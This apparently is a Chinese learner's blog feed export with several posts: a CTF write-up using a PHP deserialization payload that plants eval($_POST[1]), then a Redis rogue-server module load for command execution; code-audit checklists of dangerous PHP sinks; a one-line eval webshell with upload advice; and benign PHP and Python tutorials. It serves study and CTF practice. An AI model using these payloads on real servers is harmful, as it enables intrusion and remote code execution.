<figure class="highlight css"><table><tr><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:1</span><span class="hljs-selector-pseudo">:&quot;B&quot;</span><span class="hljs-selector-pseudo">:1</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;<span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;code&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">16</span>:<span class="hljs-string">&quot;eval($_POST[1]);&quot;</span>;&#125;&#125;<br></code></pre></td></tr></table></figure>

<p>修改下</p>
<p><img src="/2021/10/26/2021/nss/1/image-20211026200240301.png" alt="image-20211026200240301"></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><code class="hljs angelscript">O:<span class="hljs-number">1</span>:%<span class="hljs-number">22</span>B%<span class="hljs-number">22</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:%<span class="hljs-number">22</span>a%<span class="hljs-number">22</span>;O:<span class="hljs-number">1</span>:%<span class="hljs-number">22</span>a%<span class="hljs-number">22</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:%<span class="hljs-number">22</span>code%<span class="hljs-number">22</span>;s:<span class="hljs-number">19</span>:%<span class="hljs-number">22</span>eval($_REQUEST[<span class="hljs-number">1</span>]);%<span class="hljs-number">22</span>;&#125;&#125;<br></code></pre></td></tr></table></figure>

<p>蚁剑连接</p>
<p><img src="/2021/10/26/2021/nss/1/image-20211026200705897.png" alt="image-20211026200705897"></p>
<p>接下来就是redis主从复制打的知识点了</p>
<p>进去之后发现权限很低，无法遍历文件和目录，命令也无法执行</p>
<p><a href="https://blog.csdn.net/Xxy605/article/details/120442213?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163332078116780261941810%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=163332078116780261941810&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-3-120442213.first_rank_v2_pc_rank_v29&amp;utm_term=%E5%A4%A9%E7%BF%BC%E6%9D%AF+easy_eval&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/Xxy605/article/details/120442213?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163332078116780261941810%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=163332078116780261941810&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-3-120442213.first_rank_v2_pc_rank_v29&amp;utm_term=%E5%A4%A9%E7%BF%BC%E6%9D%AF+easy_eval&amp;spm=1018.2226.3001.4187</a></p>
<ul>
<li>Redis加载恶意so获取shell</li>
</ul>
<p>先看到有一个config文件</p>
<p>拖到kali里恢复（win打开乱码）</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><code class="hljs arduino">vi -r <span class="hljs-built_in">config</span>.php<br></code></pre></td></tr></table></figure>

<p>得到</p>
<p><img src="/2021/10/26/2021/nss/1/image-20211026201123824.png" alt="image-20211026201123824"></p>
<p>这里得到redis密码为：you_cannot_guess_it</p>
<p>接着就是打redis</p>
<p>再回到phpinfo看</p>
<p><img src="/2021/10/26/2021/nss/1/image-20211026201318883.png" alt="image-20211026201318883"></p>
<p>于是就知道虽然权限低，但依然有tmp文件夹可以能利用</p>
<p>传恶意so文件<a href="https://github.com/Dliv3/redis-rogue-server">https://github.com/Dliv3/redis-rogue-server</a></p>
<p><img src="/2021/10/26/2021/nss/1/image-20211026201507338.png" alt="image-20211026201507338"></p>
<p><img src="/2021/10/26/2021/nss/1/image-20211026201700208.png" alt="image-20211026201700208"></p>
<p>然后redis加载，就能拿到shell了</p>
<p>用到蚁剑插件redis管理</p>
<p><img src="/2021/10/26/2021/nss/1/image-20211026201740743.png" alt="image-20211026201740743"></p>
<p><img src="/2021/10/26/2021/nss/1/image-20211026201911110.png" alt="image-20211026201911110"></p>
<p><img src="/2021/10/26/2021/nss/1/image-20211026201933402.png" alt="image-20211026201933402"></p>
<p>执行指令</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><code class="hljs mel">MODULE LOAD <span class="hljs-string">&quot;/tmp/exp.so&quot;</span><br><span class="hljs-keyword">system</span>.<span class="hljs-keyword">exec</span> <span class="hljs-string">&quot;ls /&quot;</span><br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/26/2021/nss/1/image-20211026202056741.png" alt="image-20211026202056741"></p>
<p><img src="/2021/10/26/2021/nss/1/image-20211026202137512.png" alt="image-20211026202137512"></p>
]]></content>
      <tags>
        <tag>nss</tag>
      </tags>
  </entry>
  <entry>
    <title>php代码审计(二)</title>
    <url>/2021/09/02/2021/php/0/</url>
    <content><![CDATA[<h4 id="文件上传漏洞挖掘与利用"><a href="#文件上传漏洞挖掘与利用" class="headerlink" title="文件上传漏洞挖掘与利用"></a>文件上传漏洞挖掘与利用</h4><p>1.搜索 move_uploaded_file()函数, 在PHP中上传函数只有这一个</p>
<p>2.查看上传文件的代码是否存在限制或可以绕过</p>
<p>3.搜索include、require、include_once、require_once函数，</p>
<p>是否存在可控变量。</p>
<p>4.追踪程序运行流程，查看模块加载时包含的文件是否可控。</p>
<p><img src="/2021/09/02/2021/php/0/capture_20210902180930752.bmp" alt="capture_20210902180930752"></p>
<p>任意文件读取、下载、写入、删除、漏洞挖掘与利用</p>
<p>黑盒看功能点对应的文件， 再去读文件</p>
<p>搜索文件读取的函数， 查看是否存在直接或者直接控制的变量</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><code class="hljs mel">file_get_contents、highlight_file、<span class="hljs-keyword">fopen</span>、readfile、<span class="hljs-keyword">fread</span>、<br><br>fgetss、fgets、parse_ini_file、show_source、<span class="hljs-keyword">file</span>、<span class="hljs-keyword">fwrite</span>、<br><br>file_put_contents、unlink<br></code></pre></td></tr></table></figure>

<p><img src="/2021/09/02/2021/php/0/image-20210902181425601.png" alt="image-20210902181425601"></p>
<h4 id="SSRF漏洞挖掘与利用"><a href="#SSRF漏洞挖掘与利用" class="headerlink" title="SSRF漏洞挖掘与利用"></a>SSRF漏洞挖掘与利用</h4><p>1.找对应功能点，直接黑盒测试查看是否能简单利用，不能再去追踪流程分析传递过程。</p>
<p>2.白盒挖掘则需要搜索带有变量参数的相关函数</p>
<p>3.file_get_contents()</p>
<p>4.fsockopen()</p>
<p>5.curl_exec()</p>
<p>6.fopen()</p>
<p><img src="/2021/09/02/2021/php/0/image-20210902203610020.png" alt="image-20210902203610020"></p>
<h4 id="代码执行漏洞挖掘与利用"><a href="#代码执行漏洞挖掘与利用" class="headerlink" title="代码执行漏洞挖掘与利用"></a>代码执行漏洞挖掘与利用</h4><p>1.寻找相关代码的敏感函数， 回溯跟踪</p>
<p>2.eval、assert、preg_repleace、$_ GET($_POST[]);</p>
<p>call_user_func、call_user_func_array、array_map等函数。</p>
<p><img src="/2021/09/02/2021/php/0/image-20210902204019087.png" alt="image-20210902204019087"></p>
<h4 id="命令执行漏洞挖掘与利用"><a href="#命令执行漏洞挖掘与利用" class="headerlink" title="命令执行漏洞挖掘与利用"></a>命令执行漏洞挖掘与利用</h4><p>1.寻找相关代码的敏感函数，回溯跟踪</p>
<p>2.system、exec、shell_exec、passthru</p>
<p>反引号``、popen、ob_start、pcntl_exec</p>
<p>proc_open</p>
<p><img src="/2021/09/02/2021/php/0/image-20210902204301956.png" alt="image-20210902204301956"></p>
<h4 id="SQL注入漏洞挖掘与利用"><a href="#SQL注入漏洞挖掘与利用" class="headerlink" title="SQL注入漏洞挖掘与利用"></a>SQL注入漏洞挖掘与利用</h4><p>1.跟踪参数传递是否存在过滤，数据库查询是否使用预编译</p>
<p>2.一般数据库查询会被封装在几个核心文件中，反复调用。当然在某些复杂的功能中，</p>
<p>可能也会存在不使用封装的函数，所以需要全面排查。</p>
<p>3.在挖掘的过程中，也要注意宽字节注入、二次注入等方法的可能性。</p>
<p><img src="/2021/09/02/2021/php/0/image-20210902204505442.png" alt="image-20210902204505442"></p>
<h4 id="XSS漏洞挖掘与利用"><a href="#XSS漏洞挖掘与利用" class="headerlink" title="XSS漏洞挖掘与利用"></a>XSS漏洞挖掘与利用</h4><p>1.查看参数传递进入到输出是否存在过滤函数</p>
<p>2.常见的输出函数，print、print_r、echo、printf、sprint、die</p>
<p>var_dump、var_export等</p>
<p><img src="/2021/09/02/2021/php/0/image-20210902204739145.png" alt="image-20210902204739145"></p>
<h4 id="CSRF漏洞挖掘与利用"><a href="#CSRF漏洞挖掘与利用" class="headerlink" title="CSRF漏洞挖掘与利用"></a>CSRF漏洞挖掘与利用</h4><p>1.查看提交数据功能点，抓包查看是否token，查看核心代码中是否存在token或者referer校验</p>
<p>2.可以直接搜索token、referer关键字</p>
<p>反序列化漏洞挖掘与利用</p>
<p>搜索带有变量参数的反序列化函数unserliaze()，查看是否存在利用点</p>
<p>反序列化中需关注的函数</p>
<p><img src="/2021/09/02/2021/php/0/image-20210902205114294.png" alt="image-20210902205114294"></p>
<h4 id="install系统重装漏洞"><a href="#install系统重装漏洞" class="headerlink" title="install系统重装漏洞"></a>install系统重装漏洞</h4><p>在安装过程中，</p>
<p>需要填写Web应用的数据库配置，一般会将配置直接写入到配置文件中，</p>
<p>在写入的过程中往往没有校验</p>
<p>(有可能其他安装后修改的功能会做校验)，导致</p>
<p>直接写入php代码到配置文件中，</p>
<p>从而达到任意代码执行的目的</p>
<p>install系统重装验证绕过漏洞</p>
<p>某些CMS的install的验证不严谨，导致直接绕过重装，例如</p>
<p>1.</p>
<p>使用JavaScript跳转，但是后面的代码仍然会被执行</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$this</span>\-&gt;myclass-\&gt;notice(<span class="hljs-string">&#x27;alert(&quot;系统已安装过&quot;);window.location.href=&quot;&#x27;</span>.site_url().<span class="hljs-string">&#x27;&quot;;&#x27;</span>);<br></code></pre></td></tr></table></figure>

<p>2.</p>
<p>使用header()</p>
<p>函数进行跳转，没有使用die()</p>
<p>或者exit()结束，那么后面部分的代码仍然会</p>
<p>被执行</p>
<p>//header 头并不会结束之后的代码，漏洞出在这里</p>
<p>header( ‘location: ../index.php’);</p>
]]></content>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP and MySQL Web Development(二)</title>
    <url>/2021/09/15/2021/php/3/</url>
    <content><![CDATA[]]></content>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP and MySQL Web Development(一)</title>
    <url>/2021/09/03/2021/php/1/</url>
    <content><![CDATA[<p> 从创建示例Web应用开始：Bob的汽车零部件商店</p>
<p>创建订单表单：</p>
<p>任何服务器端脚本语言最常见的应用场景是之一</p>
<p>1.1</p>
<p>就是处理HTML表单。</p>
<p>接下来程序清单1-1：order.html，商店基础HTML代码</p>
<p><img src="/2021/09/03/2021/php/1/image-20210903110152375.png" alt="image-20210903110152375"></p>
<p>呈现画面</p>
<form action="processorder.php" method="post">
<table style="border: 0px;">
<tr style="background: #cccccc;">
    <td style="width: 150px; text-align: center;">Item</td>
    <td style="width: 15px; text-align: center;">Quantity</td>
</tr>
<tr>
    <td>Tries</td>
    <td><input type="text" name="tireqty" size="3" maxlength="3"></td>
</tr>
<tr>
    <td>Oil</td>
    <td><input type="text" name="oilqty" size="3" maxlength="3"></td>
</tr>
<tr>
    <td>Spark Plugs</td>
    <td><input type="text" name="sparkqty" size="3" maxlength="3"></td>
</tr>
<tr>
    <td colspan="2" style="text-align" : center;"><input type="submit" value="Submit Order"></td>
    </tr>
    </table>
    </form>

<p>注意：该表单的action属性被设置为能够处理客户订单的PHP脚本名称，后续会对该脚本进行增添。</p>
<p>一般地，actions属性就是用户点击提交按钮时将要载入的URL</p>
<p>用户在表单中输入的数据将按照method属性中指定的HTTP方法发送到这个URL，该方法是get（附加在URL的结尾）或者post（以单独的信息发送）。</p>
<p>1.2</p>
<p>表单的处理，需要创建在form标记的action属性中指定的处理脚本，该脚本为processorder.php，代码如下</p>
<p><img src="/2021/09/03/2021/php/1/image-20210903110937097.png" alt="image-20210903110937097"></p>
<p>我们在h2处添加了php代码</p>
<p>这样我们看到php的echo输出语句同时，</p>
<p>在html页面点击Submit Order也会有类似内容显示</p>
<p><img src="/2021/09/03/2021/php/1/image-20210903150404934.png" alt="image-20210903150404934"></p>
<p>请注意</p>
<p>我们所编写的PHP代码是如何嵌入到一个常见的HTML文件中的</p>
<p>通过浏览器，我们查看该HTML的源代码</p>
<p><img src="/2021/09/03/2021/php/1/image-20210903150637332.png" alt="image-20210903150637332"></p>
<p>以上代码并没有显示原始的PHP语句</p>
<p>这是因为PHP解释器已经运行了该脚本，并且用该脚本的输出代替了脚本的本身。</p>
<p>也就是说，通过PHP，我们可以生成能在任何浏览器中查看的纯HTML，换一个意思理解，用户的浏览并不需要理解PHP。</p>
<p>此文件组成：</p>
<p>1.HTML 2.PHP标记 3.PHP语句 4.空格</p>
<p>1.3.1</p>
<p>PHP标记</p>
<?php    为开始，

?><p>为结束</p>
<p>​        这样的标记称作PHP标记，可以告诉服务器PHP代码的开始和结束。</p>
<p>XML风格(建议使用)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Order processed.&lt;/p&gt;&#x27;</span>; <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>简短风格</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Order processed.&lt;/p&gt;&#x27;</span>; <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>1.3.2</p>
<p>PHP语句</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><code class="hljs crmsh">echo &#x27;<span class="hljs-tag">&lt;p&gt;</span><span class="hljs-keyword">Order</span> <span class="hljs-title">processed</span>.<span class="hljs-tag">&lt;/p&gt;</span>&#x27;;<br></code></pre></td></tr></table></figure>

<p>echo语句：将传递给其自身的字符串打印或者回显到浏览器</p>
<p>1.7.1</p>
<p>PHP的数据类型</p>
<p>1.整数    Integer</p>
<p>2.浮点数    Float</p>
<p>3.字符串    String</p>
<p>4.布尔    Boolean</p>
<p>5.数组    Array</p>
<p>6.对象    Object</p>
<p>附：三个特殊类型 NULL（空）、resource（资源）、</p>
<p>callable 。</p>
<p>1.7.2</p>
<p>类型强度</p>
<p>PHP是一种弱类型，或者动态型语言</p>
<p>例子：</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-meta-keyword">$total1</span> = 0;</span><br><br><span class="hljs-meta"><span class="hljs-meta-keyword">$total2</span> = 0.00;</span><br></code></pre></td></tr></table></figure>

<p>此时，$total1是一个整数类型的变量</p>
<p>而$total2是一个浮点类型的变量。</p>
<p>若添加以下代码</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><code class="hljs arcade"><span class="hljs-symbol">$total</span>2 = <span class="hljs-string">&#x27;Hello&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p>则$total2是字符串类型的变量。</p>
<p>1.7.3</p>
<p>类型转换</p>
<p>1.7.4</p>
<p>可变变量</p>
<p>附代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs php+HTML">&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br> &lt;head&gt;<br>     &lt;title&gt;Bob&#39;s Auto Parts - Order Results&lt;&#x2F;title&gt;<br> &lt;&#x2F;head&gt;<br> &lt;body&gt;<br> &lt;h1&gt;Bob&#39;s Auto Parts&lt;&#x2F;h1&gt;<br> &lt;h2&gt;Order Results&lt;&#x2F;h2&gt;<br>&lt;!-- --&gt;&lt;?php<br>&#x2F;&#x2F;  echo &#39;&lt;p&gt; Order Processed.&lt;&#x2F;p&gt;&#39;<br>&#x2F;&#x2F; ?&gt;<br>&lt;!-- --&gt;&lt;?php<br>&#x2F;&#x2F;    echo &quot;&lt;p&gt;Order processed at &quot;;<br>&#x2F;&#x2F;    echo date(&#39;H:i, jS F Y&#39;);<br>&#x2F;&#x2F;    echo &quot;&lt;&#x2F;p&gt;&quot;<br>&#x2F;&#x2F; ?&gt;<br> &lt;?php<br>  echo &quot;&lt;p&gt;Order processed at &quot;.date(&#39;H:i, jS F Y&#39;).&quot;&lt;&#x2F;p&gt;&quot;<br> ?&gt;<br> &lt;?php<br>  $tireqty &#x3D; $_POST[&#39;tireqty&#39;];<br>  $oilqty &#x3D; $_POST[&#39;oilqty&#39;];<br>  $sparkqty &#x3D; $_POST[&#39;sparkqty&#39;];<br>  $address &#x3D; $_POST[&#39;address&#39;];<br>  echo &#39;&lt;p&gt;Your order is as follows: &lt;&#x2F;p&gt;&#39;;<br>  echo htmlspecialchars($tireqty).&#39; tires&lt;br &#x2F;&gt;&#39;;<br>  echo htmlspecialchars($oilqty).&#39; bottle of oil&lt;br &#x2F;&gt;&#39;;<br>  echo htmlspecialchars($sparkqty).&#39; spark plugs&lt;br &#x2F;&gt;&#39;;<br>  echo &#39;address is &#39;.htmlspecialchars($address);<br> ?&gt;<br>&lt;!-- --&gt;&lt;?php<br>&#x2F;&#x2F;  echo phpinfo();<br>&#x2F;&#x2F; ?&gt;<br> &lt;?php<br> $totalqty  &#x3D; 0;<br> $totalqty &#x3D; $tireqty + $oilqty + $sparkqty;<br> echo &quot;&lt;p&gt;Items ordered :&quot;. $totalqty.&quot;&lt;&#x2F;br&gt;&quot;;<br> $totalomunt &#x3D; 0.00;<br><br> define(&#39;TIREPRICE&#39;, 100);<br> define(&#39;OILPRICE&#39;, 10);<br> define(&#39;SPARKPRICE&#39;, 4);<br> $totalomunt &#x3D; $tireqty * TIREPRICE<br>     + $oilqty * OILPRICE<br>     + $sparkqty * SPARKPRICE;<br><br><br> echo &quot;Subtotal: $&quot;.number_format($totalomunt,2).&quot;&lt;&#x2F;br&gt;&quot;;<br><br> $taxrate &#x3D; 0.10;<br> $totalomunt &#x3D; $totalomunt * (1+ $taxrate);<br> echo &quot;Total including tax: $&quot;.number_format($totalomunt,2).&quot;&lt;&#x2F;p&gt;&quot;<br> ?&gt;<br>&lt;!-- --&gt;<br><br> &lt;&#x2F;body&gt;<br>&lt;&#x2F;html&gt;<br></code></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>php拓展</title>
    <url>/2021/02/19/2021/php/php%E6%8B%93%E5%B1%95/</url>
    <content><![CDATA[<h4 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h4><h5 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h5><p>最简单的一句话：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span> php @<span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">&#x27;attack&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>​        利用文件上传漏洞，往目标网站中上传一句话木马，然后就可以在本地通过蚁剑即可获取和控制整个网站目录。</p>
<p>​        @表示后面即使执行错误，也不报错。<strong>eval（）函数</strong>表示括号内的语句字符串什么/.的全都当做代码执行。$_POST[‘attack’]表示从页面中获得attack这个参数值。（也就是[‘     ‘]里的数值可以改变，作为密码）</p>
<h5 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h5><p>​                    （1）木马上传成功，未被杀；<br>​                    （2）知道木马的路径在哪；<br>​                    （3）上传的木马能正常运行。</p>
<h4 id="php-require-once的使用方法总结"><a href="#php-require-once的使用方法总结" class="headerlink" title="php require_once的使用方法总结"></a>php require_once的使用方法总结</h4><p><a href="https://www.php.cn/php-weizijiaocheng-370472.html">https://www.php.cn/php-weizijiaocheng-370472.html</a></p>
<p>​        require_once 语句和 require 语句完全相同，唯一区别是</p>
<p> require_once() 语句在脚本执行期间包括并运行指定文件。此行为和 require() 语句类似，唯一区别是如果该文件中的代码已经被包括了，则不会再次包括。</p>
<p>例子：</p>
<p>比如你写了一个类文件a.php，这个文件主要是定义类，代码可能如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">p</span></span><br><span class="hljs-class"></span><br><span class="hljs-class"></span>&#123;<br><br><span class="hljs-keyword">public</span> $a;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">make</span>(<span class="hljs-params">&#125;</span></span><br><span class="hljs-function"><span class="hljs-params"> &#123;</span></span><br><span class="hljs-function"><span class="hljs-params"> </span></span><br><span class="hljs-function"><span class="hljs-params"> <span class="hljs-keyword">echo</span> $a;</span></span><br><span class="hljs-function"><span class="hljs-params"> </span></span><br><span class="hljs-function"><span class="hljs-params"> &#125;</span></span><br><span class="hljs-function"><span class="hljs-params"> </span></span><br><span class="hljs-function"><span class="hljs-params">&#125;</span></span><br></code></pre></td></tr></table></figure>

<p>这个时候你在文件b.php中要使用到该类，就可以再b.php开头加上</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><code class="hljs reasonml">require<span class="hljs-constructor">_once(<span class="hljs-params">a</span>.<span class="hljs-params">php</span>)</span>;<br></code></pre></td></tr></table></figure>

<p>来加载这个a.php，就相当于把a.php的文件的代码复制到了b.php中。</p>
<p>类似的方法还有requeire(),include(),include_once()其中带_once字样的方法都是声明只加载一次，因为你require_once()的别文件中可能已经require_once(a.php)了，如果再加载就造成重复加载，代码量会增加造成解析减慢。</p>
]]></content>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>php代码审计(三)</title>
    <url>/2021/09/05/2021/php/2/</url>
    <content><![CDATA[<p> 这是一次对单独文章的分析</p>
<p>来自于安全客：</p>
<p><a href="https://www.anquanke.com/post/id/250537">ThinkPHP 3.2.3 漏洞复现 - 安全客，安全资讯平台 (anquanke.com)</a></p>
]]></content>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>python</title>
    <url>/2021/04/08/2021/python/python-picture/</url>
    <content><![CDATA[<h4 id="“Python之禅”"><a href="#“Python之禅”" class="headerlink" title="“Python之禅”"></a>“<strong>Python之禅”</strong></h4><p>The Zen of Python, by Tim Peters</p>
<p>Beautiful is better than ugly.<br>Explicit is better than implicit.<br>Simple is better than complex.<br>Complex is better than complicated.<br>Flat is better than nested.<br>Sparse is better than dense.<br>Readability counts.<br>Special cases aren’t special enough to break the rules.<br>Although practicality beats purity.<br>Errors should never pass silently.<br>Unless explicitly silenced.<br>In the face of ambiguity, refuse the temptation to guess.<br>There should be one– and preferably only one –obvious way to do it.<br>Although that way may not be obvious at first unless you’re Dutch.<br>Now is better than never.<br>Although never is often better than <em>right</em> now.<br>If the implementation is hard to explain, it’s a bad idea.<br>If the implementation is easy to explain, it may be a good idea.<br>Namespaces are one honking great idea – let’s do more of those!   </p>
<h3 id="python学习"><a href="#python学习" class="headerlink" title="python学习"></a>python学习</h3><p><img src="/2021/04/08/2021/python/python-picture/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(126).png"></p>
<p>在字符串中使用变量</p>
<p><code>first_name = &quot;ada&quot;</code><br><code>last_name = &quot;lovelace&quot;</code><br><code>full_name = f&quot;&#123;first_name&#125; &#123;last_name&#125;&quot;</code></p>
<p>要在字符串中插入变量的值，可在引号面前加上字母f，再将要插入的变量放在花括号内。这样，当python显示字符串时，将把每个变量都替换为其值。</p>
<p>这种字符串名为f字符串。f是format格式（设置格式）的简写，因为python通过把花括号内的变量替换为其值来设置字符串的格式。上述输出的代码如下</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ada lovace</span><br></code></pre></td></tr></table></figure>

<p><img src="/2021/04/08/2021/python/python-picture/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(127).png"></p>
<p>last_owned = motorcycles.pop[0],默认是将最后一个元素“弹出栈元素”</p>
<p>remove删除特定元素</p>
<p>sort自动排序</p>
<h4 id="关于循环"><a href="#关于循环" class="headerlink" title="关于循环"></a>关于循环</h4><p>如定义变量dimension = （200，50）</p>
<p>使用循环时却是：for dimension in dimensions:</p>
<p>​                               print(dimensions)</p>
<p><img src="/2021/04/08/2021/python/python-picture/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(132).png"></p>
<h4 id="闲暇的佩奇"><a href="#闲暇的佩奇" class="headerlink" title="闲暇的佩奇"></a>闲暇的佩奇</h4><p><img src="/2021/04/08/2021/python/python-picture/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(131).png"></p>
<h4 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h4><p>一度中断，貌似是为了之前的python2.7.11来执行sqlmap，这次好像不能同时添加路径，不然就报错</p>
<h4 id="windows终端运行python程序"><a href="#windows终端运行python程序" class="headerlink" title="windows终端运行python程序"></a>windows终端运行python程序</h4><p>如下图所示嗷</p>
<p><img src="/2021/04/08/2021/python/python-picture/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(133).png"></p>
<h4 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h4><p>python的循环虽然没有像c语言一样样式看起来比较繁杂，</p>
<p>但是还是有一定要求的</p>
<p>比如尝试while循环时，出现了以下情况：</p>
<p>我想实现的功能是将1赋值给current_number后，进入循环，直到current_number大于5</p>
<p>这里没有空格（也就是和print对齐）造成了无限加1的画面。</p>
<p>修改之后：</p>
<p>发现python真的好坑（有点无语），对于对齐和空格有着严格的要求</p>
<p>比如没有遵守就会出现以下画面和英文提示:</p>
<figure class="highlight actionscript"><table><tr><td class="code"><pre><code class="hljs actionscript">Inconsistent <span class="hljs-keyword">use</span> of tabs and spaces <span class="hljs-keyword">in</span> indentation<br></code></pre></td></tr></table></figure>

<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">IndentationError: unindent does <span class="hljs-keyword">not</span> match <span class="hljs-keyword">any</span> <span class="hljs-keyword">outer</span> indentation <span class="hljs-keyword">level</span><br></code></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/2019031210572084.png" alt="问题"></p>
<p>成功找到解决方法，一个是pycharm软件格式化，不过我已经删掉</p>
<p>另外就是用notepad++的视图里显示空格，见文章：<a href="https://blog.csdn.net/hhy_csdn/article/details/82263757">https://blog.csdn.net/hhy_csdn/article/details/82263757</a></p>
<h4 id="传递任意数量的实参"><a href="#传递任意数量的实参" class="headerlink" title="传递任意数量的实参"></a>传递任意数量的实参</h4><p>例如，来看一个制作披萨的函数，它需要接受很多配料，但无法预先确定顾客要多少种配料。</p>
<p>下面的函数只有一个形参*toppings,但不管调用语句提供了多少实参，这个形参会将它们统统收入囊中。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">make_pizza</span>(<span class="hljs-params">*toppings</span>):</span><br>	<span class="hljs-string">&quot;&quot;&quot;打印顾客点的所有配料。&quot;&quot;&quot;</span><br>	print(toppings)<br>make_pizza(<span class="hljs-string">&#x27;pepproni&#x27;</span>)<br>make_pizza(<span class="hljs-string">&#x27;mushrooms&#x27;</span>,<span class="hljs-string">&#x27;green peppers&#x27;</span>,<span class="hljs-string">&#x27;extra cheese&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p><img src="/2021/04/08/2021/python/python-picture/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(142).png"></p>
<p>python中运算优先级顺序为 NOT、AND、OR。</p>
]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>php代码审计(一)</title>
    <url>/2021/08/31/2021/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/</url>
    <content><![CDATA[<p> <strong>文章内容来自于：安恒信息</strong></p>
<h3 id="通用代码审计思路："><a href="#通用代码审计思路：" class="headerlink" title="通用代码审计思路："></a>通用代码审计思路：</h3><h4 id="1-根据敏感关键字回溯参数传递过程-逆向追踪"><a href="#1-根据敏感关键字回溯参数传递过程-逆向追踪" class="headerlink" title="1.根据敏感关键字回溯参数传递过程(逆向追踪)"></a>1.根据敏感关键字回溯参数传递过程(逆向追踪)</h4><p>​            检查敏感函数的参数，进行回溯变量，判断变量是否可控并且没有经过严格的过滤，这是一个逆向追踪的过程。</p>
<h4 id="2-寻找可控参数，正向追踪变量传递过程-正向追踪"><a href="#2-寻找可控参数，正向追踪变量传递过程-正向追踪" class="headerlink" title="2.寻找可控参数，正向追踪变量传递过程(正向追踪)"></a>2.寻找可控参数，正向追踪变量传递过程(正向追踪)</h4><p>​            跟踪传递的参数，判断是否存入到敏感函数内或者传递的过程中具有代码逻辑漏洞。</p>
<h4 id="3-寻找敏感功能点，通读功能点代码-直接挖掘功能点漏洞"><a href="#3-寻找敏感功能点，通读功能点代码-直接挖掘功能点漏洞" class="headerlink" title="3.寻找敏感功能点，通读功能点代码(直接挖掘功能点漏洞)"></a>3.寻找敏感功能点，通读功能点代码(直接挖掘功能点漏洞)</h4><p>​            根据自身经验判断在该应用中的哪些功能可能出现漏洞。</p>
